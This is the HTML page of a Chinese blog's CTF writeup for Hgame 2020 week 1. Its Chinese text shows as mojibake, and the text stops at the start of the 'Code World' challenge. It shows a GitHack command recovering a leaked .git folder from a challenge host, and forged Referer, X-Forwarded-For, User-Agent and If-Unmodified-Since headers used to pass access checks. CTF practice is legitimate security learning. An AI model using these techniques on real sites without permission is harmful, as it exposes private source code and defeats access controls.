<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 5.4.0">


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">
  <meta name="baidu-site-verification" content="NkA6ndXFZC">

<link rel="stylesheet" href="/css/main.css">



<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.15.3/css/all.min.css" integrity="sha256-2H3fkXt6FEmrReK448mDVGKb3WW2ZZw35gI7vqHOE4Y=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">

<script class="next-config" data-name="main" type="application/json">{"hostname":"www.xi4oyu.top","root":"/","images":"/images","scheme":"Gemini","version":"8.7.0","exturl":false,"sidebar":{"position":"right","display":"post","padding":18,"offset":12},"copycode":true,"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":"gitalk","storage":true,"lazyload":false,"nav":null,"activeClass":"gitalk"},"motion":{"enable":true,"async":true,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"æœç´¢...","empty":"æ²¡æœ‰æ‰¾åˆ°ä»»ä½•æœç´¢ç»“æœï¼š${query}","hits_time":"æ‰¾åˆ° ${hits} ä¸ªæœç´¢ç»“æœï¼ˆç”¨æ—¶ ${time} æ¯«ç§’ï¼‰","hits":"æ‰¾åˆ° ${hits} ä¸ªæœç´¢ç»“æœ"},"path":"/search.xml","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>
<meta name="description" content="hgame ctfæ¯”èµ›ç¬¬ä¸€å‘¨çš„writeup">
<meta property="og:type" content="article">
<meta property="og:title" content="Hgame-week1-writeup">
<meta property="og:url" content="http://www.xi4oyu.top/20ebc87d/index.html">
<meta property="og:site_name" content="feather&#39;s blog">
<meta property="og:description" content="hgame ctfæ¯”èµ›ç¬¬ä¸€å‘¨çš„writeup">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://www.xi4oyu.top/images/20ebc87d/web-1-1.png">
<meta property="og:image" content="http://www.xi4oyu.top/images/20ebc87d/web-1-2.png">
<meta property="og:image" content="http://www.xi4oyu.top/images/20ebc87d/web-1-3.png">
<meta property="og:image" content="http://www.xi4oyu.top/images/20ebc87d/web-2-1.png">
<meta property="og:image" content="http://www.xi4oyu.top/images/20ebc87d/web-2-2.png">
<meta property="og:image" content="http://www.xi4oyu.top/images/20ebc87d/web-2-3.png">
<meta property="og:image" content="http://www.xi4oyu.top/images/20ebc87d/web-2-4.png">
<meta property="og:image" content="http://www.xi4oyu.top/images/20ebc87d/web-2-5.png">
<meta property="og:image" content="http://www.xi4oyu.top/images/20ebc87d/web-2-6.png">
<meta property="og:image" content="http://www.xi4oyu.top/images/20ebc87d/web-3-1.png">
<meta property="og:image" content="http://www.xi4oyu.top/images/20ebc87d/web-3-2.png">
<meta property="og:image" content="http://www.xi4oyu.top/images/20ebc87d/web-3-3.png">
<meta property="og:image" content="http://www.xi4oyu.top/images/20ebc87d/web-3-4.png">
<meta property="og:image" content="http://www.xi4oyu.top/images/20ebc87d/web-3-5.png">
<meta property="og:image" content="http://www.xi4oyu.top/images/20ebc87d/web-4-1.png">
<meta property="og:image" content="http://www.xi4oyu.top/images/20ebc87d/web-4-2.png">
<meta property="og:image" content="http://www.xi4oyu.top/images/20ebc87d/web-4-3.png">
<meta property="og:image" content="http://www.xi4oyu.top/images/20ebc87d/re-1-1.png">
<meta property="og:image" content="http://www.xi4oyu.top/images/20ebc87d/re-1-2.png">
<meta property="og:image" content="http://www.xi4oyu.top/images/20ebc87d/re-1-3.png">
<meta property="og:image" content="http://www.xi4oyu.top/images/20ebc87d/re-1-4.png">
<meta property="og:image" content="http://www.xi4oyu.top/images/20ebc87d/re-2-1.png">
<meta property="og:image" content="http://www.xi4oyu.top/images/20ebc87d/re-2-2.png">
<meta property="og:image" content="http://www.xi4oyu.top/images/20ebc87d/re-2-3.png">
<meta property="og:image" content="http://www.xi4oyu.top/images/20ebc87d/re-2-4.png">
<meta property="og:image" content="http://www.xi4oyu.top/images/20ebc87d/re-2-5.png">
<meta property="og:image" content="http://www.xi4oyu.top/images/20ebc87d/re-3-1.png">
<meta property="og:image" content="http://www.xi4oyu.top/images/20ebc87d/re-3-2.png">
<meta property="og:image" content="http://www.xi4oyu.top/images/20ebc87d/re-3-3.png">
<meta property="og:image" content="http://www.xi4oyu.top/images/20ebc87d/re-4-1.png">
<meta property="og:image" content="http://www.xi4oyu.top/images/20ebc87d/re-4-2.png">
<meta property="og:image" content="http://www.xi4oyu.top/images/20ebc87d/re-4-3.png">
<meta property="og:image" content="http://www.xi4oyu.top/images/20ebc87d/pwn-1-1.png">
<meta property="og:image" content="http://www.xi4oyu.top/images/20ebc87d/pwn-1-2.png">
<meta property="og:image" content="http://www.xi4oyu.top/images/20ebc87d/pwn-1-3.png">
<meta property="og:image" content="http://www.xi4oyu.top/images/20ebc87d/pwn-1-4.png">
<meta property="og:image" content="http://www.xi4oyu.top/images/20ebc87d/pwn-2-1.png">
<meta property="og:image" content="http://www.xi4oyu.top/images/20ebc87d/pwn-2-2.png">
<meta property="og:image" content="http://www.xi4oyu.top/images/20ebc87d/pwn-3-1.png">
<meta property="og:image" content="http://www.xi4oyu.top/images/20ebc87d/pwn-3-2.png">
<meta property="og:image" content="http://www.xi4oyu.top/images/20ebc87d/pwn-4-1.png">
<meta property="og:image" content="http://www.xi4oyu.top/images/20ebc87d/crypto-4-1.png">
<meta property="og:image" content="http://www.xi4oyu.top/images/20ebc87d/misc-2-1.png">
<meta property="og:image" content="http://www.xi4oyu.top/images/20ebc87d/misc-2-2.png">
<meta property="og:image" content="http://www.xi4oyu.top/images/20ebc87d/misc-2-3.png">
<meta property="og:image" content="http://www.xi4oyu.top/images/20ebc87d/misc-2-4.png">
<meta property="og:image" content="http://www.xi4oyu.top/images/20ebc87d/misc-3-1.png">
<meta property="og:image" content="http://www.xi4oyu.top/images/20ebc87d/misc-3-2.png">
<meta property="og:image" content="http://www.xi4oyu.top/images/20ebc87d/misc-3-3.png">
<meta property="og:image" content="http://www.xi4oyu.top/images/20ebc87d/misc-3-4.png">
<meta property="og:image" content="http://www.xi4oyu.top/images/20ebc87d/misc-3-5.png">
<meta property="og:image" content="http://www.xi4oyu.top/images/20ebc87d/misc-3-6.png">
<meta property="og:image" content="http://www.xi4oyu.top/images/20ebc87d/misc-4-1.png">
<meta property="og:image" content="http://www.xi4oyu.top/images/20ebc87d/misc-4-2.png">
<meta property="og:image" content="http://www.xi4oyu.top/images/20ebc87d/misc-4-3.png">
<meta property="og:image" content="http://www.xi4oyu.top/images/20ebc87d/misc-4-4.png">
<meta property="og:image" content="http://www.xi4oyu.top/images/20ebc87d/misc-4-5.png">
<meta property="og:image" content="http://www.xi4oyu.top/images/20ebc87d/misc-4-6.png">
<meta property="og:image" content="http://www.xi4oyu.top/images/20ebc87d/misc-4-7.png">
<meta property="og:image" content="http://www.xi4oyu.top/images/20ebc87d/misc-4-8.png">
<meta property="og:image" content="http://www.xi4oyu.top/images/20ebc87d/misc-5-1.png">
<meta property="og:image" content="http://www.xi4oyu.top/images/20ebc87d/misc-5-2.png">
<meta property="og:image" content="http://www.xi4oyu.top/images/20ebc87d/misc-5-3.png">
<meta property="og:image" content="http://www.xi4oyu.top/images/20ebc87d/misc-5-4.png">
<meta property="og:image" content="http://www.xi4oyu.top/images/20ebc87d/misc-5-5.png">
<meta property="article:published_time" content="2020-02-02T03:58:00.000Z">
<meta property="article:modified_time" content="2020-02-02T03:58:00.000Z">
<meta property="article:author" content="feather">
<meta property="article:tag" content="writeup">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://www.xi4oyu.top/images/20ebc87d/web-1-1.png">


<link rel="canonical" href="http://www.xi4oyu.top/20ebc87d/">



<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"http://www.xi4oyu.top/20ebc87d/","path":"20ebc87d/","title":"Hgame-week1-writeup"}</script>

<script class="next-config" data-name="calendar" type="application/json">""</script>
<title>Hgame-week1-writeup | feather's blog</title>
  




  <noscript>
    <link rel="stylesheet" href="/css/noscript.css">
  </noscript>
<link rel="alternate" href="/atom.xml" title="feather's blog" type="application/atom+xml">
</head>

<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
  <div class="headband"></div>

  <main class="main">
    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="åˆ‡æ¢å¯¼èˆªæ " role="button">
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <i class="logo-line"></i>
      <h1 class="site-title">feather's blog</h1>
      <i class="logo-line"></i>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>



<nav class="site-nav">
  <ul class="main-menu menu">
        <li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>é¦–é¡µ</a></li>
        <li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>å…³äº</a></li>
        <li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>æ ‡ç­¾</a></li>
        <li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>åˆ†ç±»</a></li>
        <li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>å½’æ¡£</a></li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>æœç´¢
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup"><div class="search-header">
  <span class="search-icon">
    <i class="fa fa-search"></i>
  </span>
  <div class="search-input-container">
    <input autocomplete="off" autocapitalize="off" maxlength="80" placeholder="æœç´¢..." spellcheck="false" type="search" class="search-input">
  </div>
  <span class="popup-btn-close" role="button">
    <i class="fa fa-times-circle"></i>
  </span>
</div>
<div class="search-result-container no-result">
  <div class="search-result-icon">
    <i class="fa fa-spinner fa-pulse fa-5x"></i>
  </div>
</div>

    </div>
  </div>

</div>
        
  
  <div class="toggle sidebar-toggle" role="button">
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
  </div>

  <aside class="sidebar">

    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
      <ul class="sidebar-nav">
        <li class="sidebar-nav-toc">
          æ–‡ç« ç›®å½•
        </li>
        <li class="sidebar-nav-overview">
          ç«™ç‚¹æ¦‚è§ˆ
        </li>
      </ul>

      <div class="sidebar-panel-container">
        <!--noindex-->
        <div class="post-toc-wrap sidebar-panel">
            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Web"><span class="nav-number">1.</span> <span class="nav-text">Web</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Cosmos-%E7%9A%84%E5%8D%9A%E5%AE%A2"><span class="nav-number">1.1.</span> <span class="nav-text">Cosmos çš„åšå®¢</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%8E%A5-%E5%A4%B4-%E9%9C%B8-%E7%8E%8B"><span class="nav-number">1.2.</span> <span class="nav-text">æ¥ å¤´ éœ¸ ç‹</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Code-World"><span class="nav-number">1.3.</span> <span class="nav-text">Code World</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#405-Method-Not-Allowed"><span class="nav-number">1.4.</span> <span class="nav-text">405 Method Not Allowed</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%F0%9F%90%94%E5%B0%BC%E6%B3%B0%E7%8E%AB"><span class="nav-number">1.5.</span> <span class="nav-text">ğŸ”å°¼æ³°ç«</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Reverse"><span class="nav-number">2.</span> <span class="nav-text">Reverse</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#maze"><span class="nav-number">2.1.</span> <span class="nav-text">maze</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#bitwise-operation2"><span class="nav-number">2.2.</span> <span class="nav-text">bitwise_operation2</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#advance"><span class="nav-number">2.3.</span> <span class="nav-text">advance</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#cpp"><span class="nav-number">2.4.</span> <span class="nav-text">cpp</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Pwn"><span class="nav-number">3.</span> <span class="nav-text">Pwn</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Hard-AAAAA"><span class="nav-number">3.1.</span> <span class="nav-text">Hard_AAAAA</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Number-Killer"><span class="nav-number">3.2.</span> <span class="nav-text">Number_Killer</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#One-Shot"><span class="nav-number">3.3.</span> <span class="nav-text">One_Shot</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ROP-LEVEL0"><span class="nav-number">3.4.</span> <span class="nav-text">ROP_LEVEL0</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Crypto"><span class="nav-number">4.</span> <span class="nav-text">Crypto</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#InfantRSA"><span class="nav-number">4.1.</span> <span class="nav-text">InfantRSA</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Affine"><span class="nav-number">4.2.</span> <span class="nav-text">Affine</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#not-One-time"><span class="nav-number">4.3.</span> <span class="nav-text">not_One-time</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Reorder"><span class="nav-number">4.4.</span> <span class="nav-text">Reorder</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Misc"><span class="nav-number">5.</span> <span class="nav-text">Misc</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%AC%A2%E8%BF%8E%E5%8F%82%E5%8A%A0HGame%EF%BC%81"><span class="nav-number">5.1.</span> <span class="nav-text">æ¬¢è¿å‚åŠ HGameï¼</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%A3%81%E7%BA%B8"><span class="nav-number">5.2.</span> <span class="nav-text">å£çº¸</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%85%8B%E8%8B%8F%E9%B2%81%E7%A5%9E%E8%AF%9D"><span class="nav-number">5.3.</span> <span class="nav-text">å…‹è‹é²ç¥è¯</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AD%BE%E5%88%B0%E9%A2%98ProPlus"><span class="nav-number">5.4.</span> <span class="nav-text">ç­¾åˆ°é¢˜ProPlus</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%AF%8F%E6%97%A5%E6%8E%A8%E8%8D%90"><span class="nav-number">5.5.</span> <span class="nav-text">æ¯æ—¥æ¨è</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%80%BB%E7%BB%93"><span class="nav-number">6.</span> <span class="nav-text">æ€»ç»“</span></a></li></ol></div>
        </div>
        <!--/noindex-->

        <div class="site-overview-wrap sidebar-panel">
          <div class="site-overview">
            <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="feather" src="/images/avatar.jpeg">
  <p class="site-author-name" itemprop="name">feather</p>
  <div class="site-description" itemprop="description">è®¡ç®—æœºæŠ€æœ¯&ä¸ªäººçç¢äº‹</div>
</div>
<div class="site-state-wrap site-overview-item animated">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
        <a href="/archives/">
          <span class="site-state-item-count">63</span>
          <span class="site-state-item-name">æ—¥å¿—</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
          <a href="/categories/">
        <span class="site-state-item-count">13</span>
        <span class="site-state-item-name">åˆ†ç±»</span></a>
      </div>
      <div class="site-state-item site-state-tags">
          <a href="/tags/">
        <span class="site-state-item-count">42</span>
        <span class="site-state-item-name">æ ‡ç­¾</span></a>
      </div>
  </nav>
</div>
  <div class="links-of-author site-overview-item animated">
      <span class="links-of-author-item">
        <a href="https://github.com/featherl" title="GitHub â†’ https:&#x2F;&#x2F;github.com&#x2F;featherl" rel="external nofollow noopener noreferrer" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
      </span>
      <span class="links-of-author-item">
        <a href="mailto:featherm@126.com" title="E-Mail â†’ mailto:featherm@126.com" rel="external nofollow noopener noreferrer" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
      </span>
  </div>


  <div class="links-of-blogroll site-overview-item animated">
    <div class="links-of-blogroll-title"><i class="fa fa-globe fa-fw"></i>
      Links
    </div>
    <ul class="links-of-blogroll-list">
        <li class="links-of-blogroll-item">
          <a href="https://0x4qe.github.io/" title="https:&#x2F;&#x2F;0x4qe.github.io&#x2F;" rel="noopener" target="_blank">0x4qE</a>
        </li>
        <li class="links-of-blogroll-item">
          <a href="https://wzyxv1n.top/" title="https:&#x2F;&#x2F;wzyxv1n.top&#x2F;" rel="noopener" target="_blank">è½¬çˆ·</a>
        </li>
        <li class="links-of-blogroll-item">
          <a href="https://github.red/" title="https:&#x2F;&#x2F;github.red&#x2F;" rel="noopener" target="_blank">èŒ„çš‡</a>
        </li>
        <li class="links-of-blogroll-item">
          <a href="http://fl0.top/" title="http:&#x2F;&#x2F;fl0.top&#x2F;" rel="noopener" target="_blank">qz</a>
        </li>
        <li class="links-of-blogroll-item">
          <a href="https://legr4ndk.github.io/" title="https:&#x2F;&#x2F;legr4ndk.github.io&#x2F;" rel="noopener" target="_blank">Legrandk</a>
        </li>
        <li class="links-of-blogroll-item">
          <a href="https://hikawa.ml/" title="https:&#x2F;&#x2F;hikawa.ml&#x2F;" rel="noopener" target="_blank">Akira</a>
        </li>
        <li class="links-of-blogroll-item">
          <a href="https://x9un.github.io/" title="https:&#x2F;&#x2F;x9un.github.io&#x2F;" rel="noopener" target="_blank">_357</a>
        </li>
        <li class="links-of-blogroll-item">
          <a href="https://altonhe.github.io/" title="https:&#x2F;&#x2F;altonhe.github.io&#x2F;" rel="noopener" target="_blank">Trotsky</a>
        </li>
        <li class="links-of-blogroll-item">
          <a href="https://www.thesoldierjack.cn/" title="https:&#x2F;&#x2F;www.thesoldierjack.cn&#x2F;" rel="noopener" target="_blank">digger</a>
        </li>
        <li class="links-of-blogroll-item">
          <a href="https://wr-web.github.io/" title="https:&#x2F;&#x2F;wr-web.github.io&#x2F;" rel="noopener" target="_blank">wr</a>
        </li>
        <li class="links-of-blogroll-item">
          <a href="https://annevi.cn/" title="https:&#x2F;&#x2F;annevi.cn&#x2F;" rel="noopener" target="_blank">annevi</a>
        </li>
        <li class="links-of-blogroll-item">
          <a href="http://www.zhouweitong.site/" title="http:&#x2F;&#x2F;www.zhouweitong.site&#x2F;" rel="noopener" target="_blank">obj</a>
        </li>
        <li class="links-of-blogroll-item">
          <a href="https://blog.wz22.cc/" title="https:&#x2F;&#x2F;blog.wz22.cc&#x2F;" rel="noopener" target="_blank">Moesang</a>
        </li>
        <li class="links-of-blogroll-item">
          <a href="https://me.liki.link/" title="https:&#x2F;&#x2F;me.liki.link&#x2F;" rel="noopener" target="_blank">kg</a>
        </li>
        <li class="links-of-blogroll-item">
          <a href="https://cosmos.red/" title="https:&#x2F;&#x2F;cosmos.red&#x2F;" rel="noopener" target="_blank">boss-c</a>
        </li>
        <li class="links-of-blogroll-item">
          <a href="https://jacksonyu1334.github.io/" title="https:&#x2F;&#x2F;jacksonyu1334.github.io" rel="noopener" target="_blank">jackson</a>
        </li>
        <li class="links-of-blogroll-item">
          <a href="https://cjovi.icu/" title="https:&#x2F;&#x2F;cjovi.icu&#x2F;" rel="noopener" target="_blank">cj</a>
        </li>
    </ul>
  </div>

          </div>
        </div>
      </div>
    </div>
  </aside>
  <div class="sidebar-dimmer"></div>


    </header>

    
  <div class="back-to-top" role="button" aria-label="è¿”å›é¡¶éƒ¨">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>

<noscript>
  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
</noscript>


    <div class="main-inner post posts-expand">


  


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://www.xi4oyu.top/20ebc87d/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.jpeg">
      <meta itemprop="name" content="feather">
      <meta itemprop="description" content="è®¡ç®—æœºæŠ€æœ¯&ä¸ªäººçç¢äº‹">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="feather's blog">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          Hgame-week1-writeup
        </h1>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">å‘è¡¨äº</span>

      <time title="åˆ›å»ºæ—¶é—´ï¼š2020-02-02 11:58:00" itemprop="dateCreated datePublished" datetime="2020-02-02T11:58:00+08:00">2020-02-02</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">åˆ†ç±»äº</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/hgame-2020/" itemprop="url" rel="index"><span itemprop="name">hgame-2020</span></a>
        </span>
    </span>

  
    <span class="post-meta-item" title="é˜…è¯»æ¬¡æ•°" id="busuanzi_container_page_pv">
      <span class="post-meta-item-icon">
        <i class="far fa-eye"></i>
      </span>
      <span class="post-meta-item-text">é˜…è¯»æ¬¡æ•°ï¼š</span>
      <span id="busuanzi_value_page_pv"></span>
    </span>
    <span class="post-meta-break"></span>
    <span class="post-meta-item" title="æœ¬æ–‡å­—æ•°">
      <span class="post-meta-item-icon">
        <i class="far fa-file-word"></i>
      </span>
      <span class="post-meta-item-text">æœ¬æ–‡å­—æ•°ï¼š</span>
      <span>12k</span>
    </span>
    <span class="post-meta-item" title="é˜…è¯»æ—¶é•¿">
      <span class="post-meta-item-icon">
        <i class="far fa-clock"></i>
      </span>
      <span class="post-meta-item-text">é˜…è¯»æ—¶é•¿ &asymp;</span>
      <span>11 åˆ†é’Ÿ</span>
    </span>
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
        <p>hgame ctfæ¯”èµ›ç¬¬ä¸€å‘¨çš„writeup</p>
<span id="more"></span>

<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="Cosmos-çš„åšå®¢"><a href="#Cosmos-çš„åšå®¢" class="headerlink" title="Cosmos çš„åšå®¢"></a>Cosmos çš„åšå®¢</h3><p>æ‰“å¼€åæ˜¯è¿™ä¸ªæ ·å­</p>
<p><img src="/images/20ebc87d/web-1-1.png" alt="1"></p>
<p>ç‰ˆæœ¬ç®¡ç†å·¥å…·å’ŒGitHubéƒ½æ ‡è®°æ˜æ˜¾ï¼Œæƒ³åˆ°åº”è¯¥æ˜¯<code>.git</code>æ–‡ä»¶å¤¹çš„æ³„éœ²ã€‚ä½†æ˜¯ç›´æ¥è®¿é—®<a target="_blank" rel="external nofollow noopener noreferrer" href="http://cosmos.hgame.n3ko.co/.git/">http://cosmos.hgame.n3ko.co/.git/</a>æ˜¯æ˜¾ç¤º404ï¼Œä¸ç®¡äº†ï¼Œç›´æ¥ä¸Šå·¥å…·<a target="_blank" rel="external nofollow noopener noreferrer" href="https://github.com/BugScanTeam/GitHack.git">GitHack</a></p>
<p><strong>è¿è¡Œå‘½ä»¤ï¼š</strong></p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">python GitHack.py  http://cosmos.hgame.n3ko.co/.git/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>ç„¶ååœ¨è¿™ä¸ªå·¥å…·æ‰€åœ¨ä½ç½®ä¸‹çš„ç›®å½•<code>dist/cosmos.hgame.n3ko.co/.git/</code>ä¸‹ï¼Œå‘ç°<code>config</code>æ–‡ä»¶æœ‰é—®é¢˜ï¼ˆæ‰¾äº†å¥½ä¹…æ‰å‘ç°ï¼‰</p>
<p><img src="/images/20ebc87d/web-1-2.png" alt="2"></p>
<p>ç„¶åå°±å»ä¸Šå›¾ä¸­çš„ä»“åº“<a target="_blank" rel="external nofollow noopener noreferrer" href="https://github.com/FeYcYodhrPDJSru/8LTUKCL83VLhXbc">https://github.com/FeYcYodhrPDJSru/8LTUKCL83VLhXbc</a>æ‰¾ï¼Œå‘ç°å…¶ä¸­ä¸€ä¸ªcommitæœ‰flagä¿¡æ¯ï¼š</p>
<p><img src="/images/20ebc87d/web-1-3.png" alt></p>
<p>æ ¹æ®æç¤ºè§£ç å¾—åˆ°flagï¼š<code>hgame&#123;g1t_le@k_1s_danger0us_!!!!&#125;</code></p>
<hr>
<h3 id="æ¥-å¤´-éœ¸-ç‹"><a href="#æ¥-å¤´-éœ¸-ç‹" class="headerlink" title="æ¥ å¤´ éœ¸ ç‹"></a>æ¥ å¤´ éœ¸ ç‹</h3><p>é¦–å…ˆå½“ç„¶æ˜¯æ‰“å¼€é“¾æ¥å•¦</p>
<p><img src="/images/20ebc87d/web-2-1.png" alt></p>
<p>æ ¹æ®æç¤ºè¯´è¦ä»<a target="_blank" rel="external nofollow noopener noreferrer" href="https://vidar.club/">https://vidar.club/</a>è¿‡æ¥è¿™ä¸ªé¡µé¢ï¼Œé‚£å°±å»googleä¸‹httpçš„å¤´å“ªäº›å¯ä»¥è¡¨ç¤ºä»å“ªé‡Œè·³è½¬æ¥çš„ï¼Œå‘ç°ä¸€ä¸ª<code>Referer</code>å¤´ï¼Œæ‰”åˆ°burpsuiteé‡Œè¯•</p>
<p><img src="/images/20ebc87d/web-2-2.png" alt="2"></p>
<p>çœ‹æ¥åˆè¦ä»æœ¬åœ°è®¿é—®ï¼Œé‚£è‚¯å®šæ˜¯ä¼ªé€ ipæˆ<code>127.0.0.1</code>äº†ï¼Œgoogleå‘ç°<code>X-Forwarded-For</code>å¤´å¯ä»¥ä¼ªé€ è¯·æ±‚ipï¼Œå†æ‰”burpsuiteé‡Œ</p>
<p><img src="/images/20ebc87d/web-2-3.png" alt="3"></p>
<p>æ¯äº†ï¼Œè¿˜è¦æ”¹æµè§ˆå™¨æ ‡è¯†ï¼Œ<code>User-Agent</code>å¤´æ”¹æˆ<code>Cosmos</code>å³å¯</p>
<p><img src="/images/20ebc87d/web-2-4.png" alt="4"></p>
<p>ã€‚ã€‚ã€‚è¿˜è¦æ”¹ä¸€ä¸‹è¯·æ±‚æ–¹å¼</p>
<p><img src="/images/20ebc87d/web-2-5.png" alt="5"></p>
<p>æœ€åè¿™ä¸ªï¼Œå‘ƒï¼Œè¦ä¼ªé€ å‘å‡ºè¯·æ±‚æ—¶çš„æ—¶é—´æˆ2077å¹´ä¹‹åï¼Œç„¶ågoogleäº†æ‰€æœ‰æœ‰å…³æ—¶é—´çš„httpå¤´ï¼Œä¸€ä¸ªä¸€ä¸ªè¯•ï¼ˆæ­¤å¤„çœç•¥æ— æ•°æ¬¡å¤±è´¥ï¼‰ï¼Œè¿˜é—®äº†ä¸‹å‡ºé¢˜äººï¼Œå‡ºé¢˜äººçš„çµé­‚æ‹·é—®</p>
<blockquote>
<p>â€œä½ éƒ½è¯•è¿‡äº†å—ï¼Ÿè¯•äº†å“ªäº›ï¼Ÿâ€</p>
</blockquote>
<p>çªç„¶å‘ç°æˆ‘å¥½åƒè¿˜æ²¡è¯•å®Œï¼Œæƒ³èµ·ä¹‹å‰å¿½ç•¥äº†çš„<code>If-Unmodified-Since</code>å¤´ï¼Œéšåè¿˜çœŸæ˜¯ï¼ï¼ï¼</p>
<p><img src="/images/20ebc87d/web-2-6.png" alt="6"></p>
<p>äºæ˜¯å¾—åˆ°flagï¼š<code>hgame&#123;W0w!Your_heads_@re_s0_many!&#125;</code></p>
<hr>
<h3 id="Code-World"><a href="#Code-World" class="headerlink" title="Code World"></a>Code World</h3><p>å¼€å±€å°±æ˜¯ä¸€ä¸ª403 Forbidden</p>
<p><img src="/images/20ebc87d/web-3-1.png" alt="1"></p>
